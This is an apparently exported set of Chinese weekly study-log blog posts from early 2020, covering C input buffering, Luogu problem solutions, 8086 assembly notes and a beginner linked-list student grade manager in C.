    <content><![CDATA[<h1 id="2020-1-12-2020-1-18"><a href="#2020-1-12-2020-1-18" class="headerlink" title="2020.1.12-2020.1.18"></a>2020.1.12-2020.1.18</h1><hr>
<h3 id="1-scanf、getchar、getch、getche和缓冲区"><a href="#1-scanf、getchar、getch、getche和缓冲区" class="headerlink" title="1.scanf、getchar、getch、getche和缓冲区"></a>1.scanf、getchar、getch、getche和缓冲区</h3><p><a href="https://cloud.tencent.com/developer/article/1354983" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1354983</a><br><a href="https://www.cnblogs.com/lanhaicode/p/10575049.html" target="_blank" rel="noopener">https://www.cnblogs.com/lanhaicode/p/10575049.html</a></p>
<blockquote>
<p>读取字符时：<br>(1)scanf()以 Enter 结束一次输入，不会舍弃最后的回车符（即回车符会残留在缓冲区中）；<br>(2)getchar()以 Enter 结束输入，不会舍弃最后的回车符。<br>读取字符串时：<br>(1) scanf()以Space、Enter、Tab结束一次输入，不会舍弃最后的回车符；<br>(2) gets()以Enter结束输入（空格不结束），接受空格，会舍弃最后的回车符！<br>所以读取一个字符串中的每一个字符的时候，往往使用getchar()而不使用scanf()，因为一个字符串中是会出现空格的。如果使用scanf()会造成将一个字符串首先读入第一个空格前的部分，其余部分会残留在输入缓冲区的情况，在下次读取时可能会出现错误。<br>其次为了避免出现上述问题，必须要在读取输入前，清空缓冲区的残留数据<br><a id="more"></a><br>缓冲区是一块内存空间，用来缓存数据，目的是让快速的cpu不必等待慢速的输入输出设备，同时减少操作硬件的次数</p>
</blockquote>
<p>根据数据刷新的时机可将缓冲区类型分为<br>1.全缓冲：当缓冲区被填满以后才进行真正的输入输出操作<br>2.行缓冲：当输入或输出时遇到换行符时才进行真正的输入输出操作<br>3.无缓冲：没有缓冲区，立即进行输入输出</p>
<p>Windows下c语言的printf是无缓冲的</p>
<h3 id="2-洛谷"><a href="#2-洛谷" class="headerlink" title="2.洛谷"></a>2.洛谷</h3><h5 id="1-P1597-语句解析"><a href="#1-P1597-语句解析" class="headerlink" title="1.P1597-语句解析"></a>1.P1597-语句解析</h5><p><img src="https://img-blog.csdnimg.cn/20200117224034766.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有啥思路就看题解了<br>因为scanf成功读入一个返回值为1，读入两个返回值为2，可以此作为循环条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">char</span> c1,c2;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%c:=%c;"</span>,&amp;c1,&amp;c2)==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(c2&gt;<span class="string">'0'</span>&amp;&amp;c2&lt;<span class="string">'a'</span>)&#123;</span><br><span class="line">			a[c1-<span class="string">'a'</span>]=c2-<span class="string">'0'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			a[c1-<span class="string">'a'</span>]=a[c2-<span class="string">'a'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d %d %d"</span>,a[<span class="number">0</span>],a[<span class="number">1</span>],a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//	char a=14;</span></span><br><span class="line"><span class="comment">//	int b;</span></span><br><span class="line"><span class="comment">//	b=a;</span></span><br><span class="line"><span class="comment">//	printf("%d",b);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-P1739-表达式括号匹配"><a href="#2-P1739-表达式括号匹配" class="headerlink" title="2.P1739-表达式括号匹配"></a>2.P1739-表达式括号匹配</h5><p><img src="https://img-blog.csdnimg.cn/20200117223137978.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一次提交了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">'@'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">'('</span>)</span><br><span class="line">			i++;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">')'</span>)</span><br><span class="line">			j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"YES"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"NO"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没考虑到右括号在左括号旁边的情况 如：)(a+1)<em>(a+2)(@<br>看了一下题解：<br><em>*每出现一个左括号+1，每出现一个右括号且该变量大于0时-1.最后整个字符串判断完之后如果这个变量值为0则原表达式是匹配的。</em></em></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">'@'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">'('</span>)&#123;</span><br><span class="line">			i++;</span><br><span class="line">			c++;</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">')'</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			<span class="keyword">if</span>(c&gt;<span class="number">0</span>)</span><br><span class="line">				c--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i&amp;&amp;c==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"YES"</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"NO"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>通过了</p>
<h3 id="3-汇编语言学习"><a href="#3-汇编语言学习" class="headerlink" title="3.汇编语言学习"></a>3.汇编语言学习</h3><h6 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h6><p>栈顶的变化范围是0~ffff，栈空时sp=0，栈满时sp也=0，一个栈容量最大为64kb<br>执行修改栈段寄存器ss的指令时，下一条指令也紧接着被执行<br>如 用t命令执行 mov ss，ax时，下一条mov sp，10也紧接着执行了</p>
<h6 id="一个源程序从写出到执行的过程"><a href="#一个源程序从写出到执行的过程" class="headerlink" title="一个源程序从写出到执行的过程"></a>一个源程序从写出到执行的过程</h6><ol>
<li>编写汇编源程序，产生了一个存储源程序的文本文件</li>
<li>用汇编语言编译程序编译源程序，产生目标文件，再用连接程序对目标文件进行连接，生成可执行文件<br>可执行文件包1.含程序（机器码）和数据，2.相关描述信息，如程序有多大，要占用多少内存空间等</li>
<li>执行可执行文件中的程序<h6 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h6>例：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"> codesg segment</span><br><span class="line"> 	mov ax,0123</span><br><span class="line"> 	mov bx,0456</span><br><span class="line"> 	add ax,bx</span><br><span class="line"> 	add ax,ax</span><br><span class="line"> 	</span><br><span class="line"> 	mov ax,4c00</span><br><span class="line"> 	int 21</span><br><span class="line"> 	</span><br><span class="line"> codesg ends</span><br><span class="line"> end</span><br></pre></td></tr></table></figure>
<ol>
<li>伪指令<br>1。<code>xxx segment\n····\nxxx ends</code><br>是必须使用到的一对伪指令，功能是定义一个段，xxx是段名<br>一个汇编程序是由多个段组成的，这些段被用来存放代码/数据/当作栈空间用<br>一个汇编程序中至少要有一个段用来存放代码<br>段名（xxx）最终将被处理为一个段的段地址<br>2。<code>end</code><br>是一个汇编程序的结束标记<br>3。<code>assume</code><br>假设某一段寄存器和程序中的某一个用 segment…ends定义的段相关联，如例中段codesg和cpu中的段寄存器cs联系起来</li>
</ol>
<h6 id="bx-和loop指令"><a href="#bx-和loop指令" class="headerlink" title="[bx]和loop指令"></a>[bx]和loop指令</h6><ol>
<li>[bx]<br>要完整地描述一个内存单元，需要两种信息：1。内存单元的地址；2.内存单元的长度（类型）（有多大）<br>mov al（ax）,[bx]   ：<br>将一个内存单元的内容送入al（ax），这个内存单元的长度为1（2）字节，存放一个字节（一个字），偏移地址在bx中，段地址在ds中。</li>
<li>loop<br>用loop指令实现循环功能，cx中存放循环次数<br>执行loop指令的时候，1.（cx）=（cx)-1 ; 2.判断（cx），不为零则转至标号处执行程序，如果为零则向下执行<br>``  例：计算2^12<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">	mov ax,2</span><br><span class="line">	</span><br><span class="line">	mov cx,11</span><br><span class="line">s:	add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.03-2020.02.09</title>
    <url>/7089.html</url>
    <content><![CDATA[<p>这周学得比较少因为刚把输入法从全拼换成双拼在练习打字….</p>
<h2 id="1-搞博客"><a href="#1-搞博客" class="headerlink" title="1.搞博客"></a>1.搞博客</h2><ul>
<li>在博客里加入了点效果（小声 bb：以前觉得应该挺复杂的，其实有了轮子之后也就一行代码的事啊）<br>参考：<a href="https://github.com/VincentGarreau/particles.js" target="_blank" rel="noopener">https://github.com/VincentGarreau/particles.js</a> -了解了 GitHub 上博客的结构<br><a href="https://www.cnblogs.com/Eaglery/p/5126279.html" target="_blank" rel="noopener">使用 GitHub,Jekyll 打造自己的免费独立博客</a><a id="more"></a>
<h2 id="2-汇编语言学习"><a href="#2-汇编语言学习" class="headerlink" title="2.汇编语言学习"></a>2.汇编语言学习</h2><h3 id="div-指令"><a href="#div-指令" class="headerlink" title="div 指令"></a>div 指令</h3></li>
<li>div 是除法指令 -除数：有 8 位和 16 位两种，在一个寄存器或内存单元中 -被除数：默认放在 ax 或 dx 和 ax 中<br>如果除数为 8 位，则被除数为 16 位，默认放在 ax 中存放<br>如果除数为 16 位，则被除数位 32 位，在 dx 和 ax 中存放，dx 存放高 16 位，ax 存放低 16 位 -结果：<br>除数为 8 位（16^2-1=255)，al 储存商，ah 储存余数<br>除数为 16 位(16^4-1=65535)，ax 储存商，dx 储存余数</li>
</ul>
<p>divbyteptrds:[0]含义：<br>~(al)=(ax)/((ds)<em>16+0)的商<br>(ah)=(ax)/((ds)</em>16+0)的余数</p>
<p>divwordptr[bx+si+8]含义：<br>~(ax)=[(dx)<em>10000h+(ax)]/((ds)</em>16+(bx)+(si)+8)的商<br>(dx)=[(dx)<em>10000h+(ax)]/((ds)\</em>16+(bx)+(si)+8)的余数</p>
<h3 id="dd-指令"><a href="#dd-指令" class="headerlink" title="dd 指令"></a>dd 指令</h3><ul>
<li>用 db 定义字节型数据  </li>
<li>用 dw 定义字型数据 </li>
<li>用 dd 定义 double（双字）型数据  </li>
</ul>
<h3 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h3><p>dup 是一个操作符，和 db、dw、dd 等数据定义伪指令配合使用，用来进行数据的重复<br>db/dw/dd 重复次数 dup（重复的数据）</p>
<p>如：<br>~db200dup（0）<br>：定义了 200 个字节的 0<br>db3dup（‘abc’）<br>：定义了 9 个字节:’abcabcabc’</p>
<h3 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h3><p>指可以修改 ip 或同时修改 cs 和 ip 的指令</p>
<p>段内转移：只修改 ip<br>~短转移：-128~127<br>近转移：-32768~32767</p>
<h2 id="3-c-语言-学生成绩管理系统"><a href="#3-c-语言-学生成绩管理系统" class="headerlink" title="3.c 语言-学生成绩管理系统"></a>3.c 语言-学生成绩管理系统</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstu&#123;</span><br><span class="line">	intnum;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	intsex;</span><br><span class="line">	intage;</span><br><span class="line">	intscore;</span><br><span class="line">	structstu*next;</span><br><span class="line">&#125;;</span><br><span class="line">structstu*p;</span><br><span class="line">voidmenu()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"choseafunction:\n"</span></span><br><span class="line">	<span class="string">"1.录入信息\n"</span></span><br><span class="line">	<span class="string">"2.打印信息\n"</span></span><br><span class="line">	<span class="string">"3.保存信息\n"</span></span><br><span class="line">	<span class="string">"4.读取信息\n"</span></span><br><span class="line">	<span class="string">"5.统计所有人数\n"</span></span><br><span class="line">	<span class="string">"6.按学号查找信息\n"</span></span><br><span class="line">	<span class="string">"7.修改信息\n"</span></span><br><span class="line">	<span class="string">"8.删除信息\n"</span></span><br><span class="line">	<span class="string">"9.退出\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">voidremove();</span><br><span class="line">voidbuild();</span><br><span class="line">voidprint(structstu*p);</span><br><span class="line">voidsum(structstu*p);</span><br><span class="line">voidsave(structstu*p);</span><br><span class="line">voidfind(structstu*p);</span><br><span class="line">voidmodify(structstu*p);</span><br><span class="line">voidread();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n)&#123;</span><br><span class="line">			case9:</span><br><span class="line">				return0;</span><br><span class="line">			case1:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case2:<span class="comment">//打印</span></span><br><span class="line">				<span class="built_in">print</span>(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case3:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case4:<span class="comment">//读取</span></span><br><span class="line">				<span class="built_in">read</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case5:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case6:<span class="comment">//查找</span></span><br><span class="line">				<span class="built_in">find</span>(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case7:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			case8:<span class="comment">//删除</span></span><br><span class="line">				<span class="built_in">remove</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Wrongnum\n"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidbuild()&#123;</span><br><span class="line">	structstu*head=<span class="literal">NULL</span>,*nextp;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"顺序输入学号姓名性别（男1女0）年龄成绩输入-1结束\n"</span>);</span><br><span class="line">	nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nextp-&gt;num);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;num!=<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s%d%d%d"</span>,nextp-&gt;name,&amp;nextp-&gt;sex,&amp;nextp-&gt;age,&amp;nextp-&gt;score);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;nextp-&gt;num);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidprint(structstu*p)&#123;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d%s%d%d%d\n"</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidsum(structstu*p)&#123;</span><br><span class="line">	inti=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">voidfind(structstu*p)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"输入学号："</span>);</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;num==num)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d%s%d%d%d\n"</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"WrongNumber\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidmodify(structstu*p)&#123;</span><br><span class="line">	structstu*head;</span><br><span class="line">	head=p;</span><br><span class="line">	intnum;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"输入修改学生的学号:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(head)&#123;</span><br><span class="line">		<span class="keyword">if</span>(head-&gt;num!=num)&#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"学号错误"</span>);</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"输入修改学生的信息:\n"</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"顺序输入姓名性别（男1女0）年龄成绩输入:\n"</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s%d%d%d"</span>,head-&gt;name,&amp;head-&gt;sex,&amp;head-&gt;age,&amp;head-&gt;score);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"成功修改\n"</span>);</span><br><span class="line">		<span class="built_in">print</span>(p);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidremove()&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"输入删除的学生学号："</span>);</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	structstu*head,*nextp,*d;</span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	d=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;num==n)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"success"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head)&#123;</span><br><span class="line">			<span class="keyword">if</span>(n!=head-&gt;num)&#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"学号错误"</span>);</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"success"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">voidsave(structstu*p)&#123;</span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">".\\stuinfo.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">while</span>(p)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">"%d%s%d%d%d\n"</span>,p-&gt;num,p-&gt;name,p-&gt;sex,p-&gt;age,p-&gt;score);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"数据保存成功。\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidread()&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		structstu*nextp=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp)&#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FILE*fp;</span><br><span class="line">	fp=fopen(<span class="string">".\\stuinfo.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"文件无法打开"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		structstu*nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;num)==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;sex);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;age);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">"%d"</span>,&amp;nextp-&gt;score);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(structstu*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstu));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.19-2020.02.02</title>
    <url>/17577.html</url>
    <content><![CDATA[<h3 id="1-用github搞了博客"><a href="#1-用github搞了博客" class="headerlink" title="1.用github搞了博客"></a>1.用github搞了博客</h3><p>参考：<a href="https://www.fast.ai/2020/01/16/fast_template/" target="_blank" rel="noopener">https://www.fast.ai/2020/01/16/fast_template/</a><br>并用了他的模板….<br>页面还没改完</p>
<h3 id="2-汇编语言学习"><a href="#2-汇编语言学习" class="headerlink" title="2.汇编语言学习"></a>2.汇编语言学习</h3><h5 id="BX-和loop指令"><a href="#BX-和loop指令" class="headerlink" title="[BX]和loop指令"></a>[BX]和loop指令</h5><p>一次执行完循环的过程：<br>g指令：<br>“g 0012”从当前的cs：ip指向的指令执行，一直到（ip）=0012为止<br>p指令：<br>直到（cx）=0为止</p>
<h5 id="段前缀："><a href="#段前缀：" class="headerlink" title="段前缀："></a>段前缀：</h5><p>在访问内存单元的指令中显式低给出内存单元段地址所在的段寄存器，如：<br>mov ax,ds:[bx]<br>mov ax,cs:[bx]<br>mov ax,ss,[bx]<br>mov ax,ex,[0]<br>….<br><a id="more"></a></p>
<h5 id="在代码段中使用数据"><a href="#在代码段中使用数据" class="headerlink" title="在代码段中使用数据"></a>在代码段中使用数据</h5><p>code segment<br>“dw 0123，0456”<br>….<br>dw的含义是定义字型数据，因为用dw定义的数据出于代码段的最开始，所以偏移地址为0，这两个数据就在代码段的偏移0，2 处，地址为cs:0,cs:2</p>
<h5 id="将数、代码、栈放入不同的段"><a href="#将数、代码、栈放入不同的段" class="headerlink" title="将数、代码、栈放入不同的段"></a>将数、代码、栈放入不同的段</h5><p>一个段的容量不能大于64kb（8086模式的限制）</p>
<blockquote>
<p>assume cs:code,ds:data,ss:stack<br>data segment<br>    dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h<br>data ends<br>stack segment<br>    dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>stack ends<br>code segment<br>start: mov ax,==stack==<br>    mov ss,ax<br>    mov sp:20h<br>    mov ax,==data==  ;将名称为data的段的段地址送入ax（数值）<br>    mov ds,ax<br>    mov bx,0<br>    mov cx,8<br>s:    push [bx]<br>    add bx,2<br>    loop s<br>    mov bx,0<br>    mov cx,8<br>s0:    pop [bx]<br>    add bx,2<br>    loop s0<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start</p>
</blockquote>
